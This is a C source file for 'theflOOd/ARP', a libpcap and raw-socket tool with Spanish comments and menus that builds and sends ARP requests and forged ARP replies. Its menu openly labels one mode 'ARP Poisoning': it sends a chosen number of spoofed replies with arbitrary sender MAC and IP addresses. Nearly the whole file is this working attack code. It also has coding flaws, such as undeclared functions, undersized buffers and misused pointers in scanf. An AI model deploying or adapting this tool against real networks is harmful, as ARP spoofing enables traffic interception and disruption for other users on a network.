#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#pragma pack(1)
unsigned char p_src_addr[15];   //src_ip buffer
unsigned char p_dst_addr[15];   //dst_ip buffer
unsigned char p_dst_mac[17];    //dst_mac buffer
char *macsender;
char *mactarget;
char *ipsender;
char *iptarget;
int *interpkttime;
int *numpkt;
unsigned char* dev;     //interface pointer
unsigned char buffer[8192];     //rawsocket data buffer
int s = -1;             //socket handler
struct sockaddr_ll sa;
int offset = 0;                 //rawsocket data offset


//Leer string truncados
char *read_string();


struct myarphdr
{
    unsigned short hw_type;           /* hardware address */
    unsigned short protocol_type;             /* protocol address */
    unsigned char hw_addr_len;       /* length of hardware address */
    unsigned char protocol_addr_len;         /* length of protocol address */
    unsigned short opcode;      /*operate code 1 ask 2 reply*/
    unsigned char src_mac[6];
    struct in_addr src_ip;
    unsigned char dst_mac[6];
    struct in_addr dst_ip;
    unsigned char padding[18];
};

int setup_eth_header(unsigned char* buffer, unsigned char* src_mac, unsigned char* dst_mac)
{
        char s_mac[6];
        sscanf(src_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &s_mac[0], &s_mac[1], &s_mac[2], &s_mac[3], &s_mac[4], &s_mac[5]);
        char d_mac[6];
        sscanf(dst_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &d_mac[0], &d_mac[1], &d_mac[2], &d_mac[3], &d_mac[4], &d_mac[5]);
        struct ethhdr ethernet_header;
        memcpy(ethernet_header.h_dest, d_mac, 6);
        memcpy(ethernet_header.h_source, s_mac, 6);
        ethernet_header.h_proto = htons(0x0806);
        memcpy(buffer, &ethernet_header, sizeof(struct ethhdr));
        return sizeof(struct ethhdr);
};

int setup_arp_header(unsigned char* buffer, unsigned char* src_mac, unsigned char* dst_mac, unsigned char* src_address, unsigned char* dst_address, int typearp){
        char s_mac[6];
        sscanf(src_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &s_mac[0], &s_mac[1], &s_mac[2], &s_mac[3], &s_mac[4], &s_mac[5]);
        char d_mac[6];
        sscanf(dst_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &d_mac[0], &d_mac[1], &d_mac[2], &d_mac[3], &d_mac[4], &d_mac[5]);
        struct myarphdr arp_header;
        arp_header.hw_type = htons(0x0001);
        arp_header.protocol_type = htons(0x0800);
        arp_header.hw_addr_len = (unsigned char)6;
        arp_header.protocol_addr_len = (unsigned char)4;
        if(typearp==1)
        {
        printf("dentro");
        arp_header.opcode = htons(0x0001);
        }else{
        arp_header.opcode = htons(0x0002);
        }
        memcpy(arp_header.src_mac, s_mac, 6);
        arp_header.src_ip.s_addr = inet_addr(src_address);
        memcpy(arp_header.dst_mac, d_mac, 6);
        arp_header.dst_ip.s_addr = inet_addr(dst_address);
        memset(arp_header.padding,0 , 18);
        memcpy(buffer, &arp_header, sizeof(struct myarphdr));
        return sizeof(struct myarphdr);
}

void generateReply()
{

    struct ether_header *eptr;
    struct myarphdr *arp;

        if(s < 0){
        s = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
        if(s < 0){
                    printf("Could not open raw socket.\n");
                    exit(-1);
        }
        }

        memset(buffer, 0 ,sizeof(buffer));
        offset = 0;

        sa.sll_ifindex  = if_nametoindex(dev);

        offset = setup_eth_header(buffer,macsender, mactarget);
        offset += setup_arp_header(buffer + offset, macsender, mactarget, ipsender, iptarget,2);

        if(sendto(s, buffer, offset, 0, (struct sockaddr *) &sa, sizeof(sa)) < 0){
            printf("arp send error!\n");
                exit(-1);
        }else{
                //printf("[ARP]inter:%s src_mac:%s dsc_mac:%s src_ip:%s dst_ip:%s\n", dev, macsender, mactarget, ipsender, iptarget);
        }

}

void generateRequest()
{

    struct ether_header *eptr;
    struct myarphdr *arp;

        if(s < 0){
        s = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
        if(s < 0){
                    printf("Could not open raw socket.\n");
                    exit(-1);
        }
        }

        memset(buffer, 0 ,sizeof(buffer));
        offset = 0;

        sa.sll_ifindex  = if_nametoindex(dev);

        offset = setup_eth_header(buffer,macsender, "FF:FF:FF:FF:FF:FF");
        offset += setup_arp_header(buffer + offset, macsender, "FF:FF:FF:FF:FF:FF", ipsender, iptarget,1);

        if(sendto(s, buffer, offset, 0, (struct sockaddr *) &sa, sizeof(sa)) < 0){
            printf("arp send error!\n");
                exit(-1);
        }else{
                //printf("[ARP]inter:%s src_mac:%s dsc_mac:%s src_ip:%s dst_ip:%s\n", dev, macsender, mactarget, ipsender, iptarget);
        }
}



int main (){

    //char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* descr;
    //struct bpf_program fp;        /* to hold compiled program */
    bpf_u_int32 pMask;            /* Mascara de subred propia */
    bpf_u_int32 pNet;             /* Dirección IP propia*/
    pcap_if_t *alldevs, *d;
    char dev_buff[64] = {0};
    int i =0;
    int op=0;

    terminaldata();
    getchar();

    // Se carga lista de dispositivos de red disponibles
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }

    //Se printa la lista de dispositivos para que el usuario elija
    printf("\nLista de dispositivos disponibles en el sistema:\n\n");
    for(d=alldevs; d; d=d->next)
    {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (Sorry, No description available for this device)\n");
    }

    // Solicita interfaz
    printf("\nIntroduzca nombre de interfaz desde el que capaturar tráfico : ");
    fgets(dev_buff, sizeof(dev_buff)-1, stdin);

    // Clear off the trailing newline that fgets sets
    dev_buff[strlen(dev_buff)-1] = 0;

    system("clear");

    dev = dev_buff;

    //Analiza si se ha intorducido interfaz
    if(strlen(dev_buff))
    {
        dev = dev_buff;
        //printf("\n ---A solicitado capturar en interfaz [%s] ---\n\n Iniciando Captura...",dev);
    }

    //Si no se ha introducido nada devuelve error
    if(dev == NULL)
    {
        printf("\n[%s]\n", errbuf);
        return -1;
    }

    // Obtiene direccion de red y mascara
    pcap_lookupnet(dev, &pNet, &pMask, errbuf);

    // Se habre el interfaz para su captura
    descr = pcap_open_live(dev, BUFSIZ, 0,-1, errbuf);
    if(descr == NULL)
    {
        printf("pcap_open_live() failed due to [%s]\n", errbuf);
        return -1;
    }

   while(op!=4 && op!=1 && op!=2 )
    {

        system("clear");
        terminaldata();

        printf("\nQue trafico desea generar     \n");
        printf("1º Rquest                        \n");
        printf("2º Reply (ARP Poisoning)         \n");
        printf("3º About theflOOd               \n");
        printf("4º Salir                          \n");

        scanf("%d",&op);

        if(op==1)
        {

            printf("Introduce MAC Sender\n");
            getchar();
            macsender=read_string();

            printf("Introduce IP Sender\n");
            getchar();
            ipsender=read_string();

            printf("Introduce IP Target\n");
            getchar();
            iptarget=read_string();
            getchar();


            system("clear");
            terminaldata();
            printf("Periodo entre paquetes (seg's)\n");
            scanf("%d",&interpkttime);
            printf("Numero de paquetes a enviar\n");
            scanf("%d",&numpkt);

            printf("Adress Resolution Protocol (request) a traves de: %s\n\n", dev);
            printf("FORMATO:\n");
            //printf("Sender MAC address: %s\n",pMask);
            //printf("Sender IP address: %s\n",pNet);
            //printf("Target MAC address: Broadcast (FF:FF:FF:FF:FF:FF)\n");
            //printf("Target IP address: %s\n",iptarget);

            arpRequest();

        }

        if(op==2)
        {

            printf("Introduce MAC Sender\n");
            getchar();
            macsender=read_string();

            printf("Introduce MAC Target\n");
            getchar();
            mactarget=read_string();

            printf("Introduce IP Sender\n");
            getchar();
            ipsender=read_string();

            printf("Introduce IP Target\n");
            getchar();
            iptarget=read_string();
            getchar();

            system("clear");
            terminaldata();
            printf("Periodo entre paquetes (seg's)\n");
            scanf("%d",&interpkttime);
            printf("Numero de paquetes a enviar\n");
            scanf("%d",&numpkt);

            printf("Adress Resolution Protocol (reply) a traves de: %s\n\n", dev);
            printf("FORMATO:\n");
            printf("Sender MAC address: %s\n",macsender);
            printf("Sender IP address: %s\n",ipsender);
            printf("Target MAC address: %s\n",mactarget);
            printf("Target IP address: %s\n",iptarget);
            arpReply();

        }

        if(op==3)
        {

            system("clear");
            about();
            getchar();
            system("clear");

        }

        if(op==4)
        {

            system("clear");
            return 0;

        }


        }





        // Por paquete recibido se llama a la función callback
        //pcap_loop(descr,-1, my_callback, NULL);


        return 0;
  }

  void arpRequest()
  {

    int cont=0;

    while(cont<numpkt)
    {
        cont++;
        sleep(interpkttime);
        printf("Pak: %d\n",cont);

        generateRequest();

    }


  }

  void arpReply()
  {

    int cont=0;

    while(cont<numpkt)
    {
        cont++;
        sleep(interpkttime);
        printf("Pak: %d\n",cont);

        generateReply();

    }

  }

  char *read_string(void) {
  char *big = NULL, *old_big;
  char s[11] = {0};
  int len = 0, old_len;

  do {
    old_len = len;
    old_big = big;
    scanf("%10[^\n]", s);
    if (!(big = realloc(big, (len += strlen(s)) + 1))) {
      free(old_big);
      fprintf(stderr, "Out of memory!\n");
      return NULL;
    }
    strcpy(big + old_len, s);
  } while (len - old_len == 10);
  return big;
}


  void terminaldata()
{

    printf("********************************************************\n");
    printf("*********************theflOOd/ARP*************************\n");
    printf("********************************************************\n");

}

void about()
{


     printf("This program is free software; you can redistribute it and/or modify\n");
     printf("it under the terms of the GNU General Public License as published by\n");
     printf("the Free Software Foundation; either version 2 of the License, or\n");
     printf("(at your option) any later version.\n");
     printf("\n");
     printf("This program is distributed in the hope that it will be useful,\n");
     printf("but WITHOUT ANY WARRANTY; without even the implied warranty of\n");
     printf("MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n");
     printf("GNU General Public License for more details.\n");
     printf("\n");
     printf("You should have received a copy of the GNU General Public License\n");
     printf("along with this program; if not, write to the Free Software\n");
     printf("Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,\n");
     printf("MA 02110-1301, USA.\n");
     printf("\n");
     printf("Author: Josu Barrientos <josu_barrientos@hotmail.com>\n");
     printf("\n");
     printf("theflOOd/ARP is an ARP traffic injector\n");

    getchar();

}
